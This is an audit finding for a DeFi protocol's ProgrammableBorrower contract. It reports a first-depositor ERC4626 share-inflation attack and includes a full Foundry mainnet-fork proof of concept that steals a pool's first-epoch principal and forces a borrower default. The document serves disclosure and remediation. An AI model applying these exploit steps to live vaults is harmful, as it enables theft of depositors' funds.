### Title
Unprotected first-deposit ERC4626 inflation drains programmable borrower funds - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` trusts the ERC4626 `deposit()` conversion and does not enforce a minimum share amount or inspect the shares returned. During the first epoch, `IdleCDOEpochVariant` transfers pool funds to the borrower, and `onStartEpoch()` deposits all of them into the configured ERC4626 vault without slippage protection. [1](#0-0) [2](#0-1) 

An unprivileged vault user can perform the classic first-depositor inflation attack: deposit one unit to mint the sole vault share, donate enough underlying to make the share price exceed the programmable borrower's deposit, and cause the borrower to receive zero shares while the vault receives all deposited assets. [3](#0-2) 

### Finding Description
`onStartEpoch()` snapshots the borrower's pre-deposit assets and then calls `_depositToVault()` for the full on-hand balance. [4](#0-3) 

`_depositToVault()` calls `vault.deposit(_assetAmount, address(this))`; the returned `shares` value is used only for the event and is never checked against `previewDeposit`, a minimum-share bound, or a post-deposit share balance. [3](#0-2) 

The position is subsequently valued through `vault.convertToAssets(vault.balanceOf(address(this)))`, so a deposit that mints zero shares leaves no recognized vault assets. [5](#0-4) 

For a target deposit `A` into an empty vault without inflation protection, the attacker deposits `1`, receives one share, and donates `D > A - 1`; the borrower's integer-floored share amount is then `A * 1 / (D + 1) == 0`, while the attacker's single share remains redeemable for the donated assets plus the borrower's `A`. ERC4626 does not require `deposit()` to revert merely because it mints zero shares. [6](#0-5) 

The attacker can redeem immediately after `startEpoch()`; the borrower has no vault assets to recall, so a subsequent withdrawal-funded or close-pool `stopEpoch` transfer fails and `_handleBorrowerDefault()` is invoked. [7](#0-6) [8](#0-7) 

### Impact Explanation
This is direct theft of the programmable borrower's first-epoch principal. For a pooled deposit `A` and attacker donation `D > A - 1`, the attacker recovers approximately `A + D`, for a net profit of approximately `A` and a corresponding protocol insolvency. [9](#0-8) 

The loss is initially hidden because the CDO continues to value its strategy tokens at par; it is realized when pending withdrawal liquidity or a close-pool recall is required, at which point the missing ERC4626 position causes a borrower default and crystallizes the loss against users. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
The attack requires the first `ProgrammableBorrower` deposit to occur into an empty ERC4626 vault that lacks virtual shares or equivalent inflation protection, and the attacker must front-run or otherwise precede the honest `startEpoch()` call. An ordinary depositor in that vault can satisfy these conditions without compromising the owner, manager, borrower, queue, or Keyring roles. [12](#0-11) 

The issue is conditional on the selected external vault: a mature vault with existing supply and inflation-resistant share accounting may prevent the zero-share outcome, while a newly configured or switched vault remains exposed because `setVault()` permits any same-asset ERC4626 once the old position is unwound. [13](#0-12) 

### Recommendation
Require `vault.deposit()` to return at least an expected minimum derived from `previewDeposit()`, and revert `onStartEpoch()` if the borrower's post-deposit share balance or `convertToAssets()` value is below a bounded tolerance. [3](#0-2) 

Prefer `mint()` with a checked maximum asset cost, bootstrap new vault integrations with protected initial liquidity, or restrict programmable borrowers to vaults that implement virtual-share inflation resistance. [14](#0-13) 

### Proof of Concept
The following Foundry fork test uses a conforming, non-malicious ERC4626-style vault whose integer-floored share calculation lacks virtual-share protection; the attacker is only a vault user and direct token sender.

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableERC4626 is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(IERC20Detailed _asset) ERC20("Vault Share", "vSHARE") {
    assetToken = _asset;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0
      ? shares
      : shares * assetToken.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    shares = supply == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    shares = assets * totalSupply() / assetToken.balanceOf(address(this));
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
  address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  IERC20Detailed underlying = IERC20Detailed(USDC);
  InflatableERC4626 vault;
  IdleCreditVault strategy;
  IdleCDOEpochVariant cdo;
  ProgrammableBorrower borrower;

  address owner = makeAddr("owner");
  address manager = makeAddr("manager");
  address lp = makeAddr("lp");
  address attacker = makeAddr("attacker");
  address realBorrower = makeAddr("realBorrower");

  function testFirstDepositInflationDrainsEpochPrincipal() public {
    vm.createSelectFork("mainnet", 19_225_935);

    strategy = new IdleCreditVault();
    strategy.initialize(USDC, owner, manager, makeAddr("placeholder"), "Borrower", 0);

    cdo = new IdleCDOEpochVariant();
    cdo.initialize(0, USDC, address(this), owner, address(1), address(strategy), 100_000);

    vault = new InflatableERC4626(underlying);

    borrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
      address(new ProgrammableBorrower()),
      makeAddr("proxyAdmin"),
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        address(vault),
        address(cdo),
        owner,
        manager,
        realBorrower,
        0
      )
    )));

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));
    vm.prank(owner);
    strategy.setBorrower(address(borrower));

    vm.startPrank(owner);
    cdo.setIsAYSActive(false);
    cdo.setFeeParams(address(this), 0, 100_000, 0);
    cdo.setEpochParams(30 days, 0);
    cdo.setIsInterestMinted(true);
    cdo.setIsProgrammableBorrower(true);
    vm.stopPrank();

    vm.prank(manager);
    strategy.setAprs(0, 0);

    uint256 depositAmount = 1_000_000e6;
    deal(USDC, lp, depositAmount);
    vm.prank(lp);
    underlying.approve(address(cdo), type(uint256).max);
    vm.prank(lp);
    cdo.depositAA(depositAmount);

    // Attacker seeds the empty vault and donates more than the upcoming deposit.
    uint256 donation = depositAmount + 1;
    deal(USDC, attacker, donation + 1);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    vault.deposit(1, attacker);
    underlying.transfer(address(vault), donation);
    vm.stopPrank();

    // Honest manager starts the epoch; ProgrammableBorrower receives zero shares.
    vm.prank(manager);
    cdo.startEpoch();

    assertEq(vault.balanceOf(address(borrower)), 0);
    assertEq(underlying.balanceOf(address(borrower)), 0);
    assertEq(vault.totalSupply(), 1);

    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 redeemed = vault.redeem(1, attacker, attacker);

    assertEq(redeemed, donation + depositAmount);
    assertEq(
      underlying.balanceOf(attacker) - attackerBefore,
      donation + depositAmount
    );

    // The stolen vault position cannot satisfy a close-pool recall.
    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 1);

    assertTrue(cdo.defaulted());
  }
}
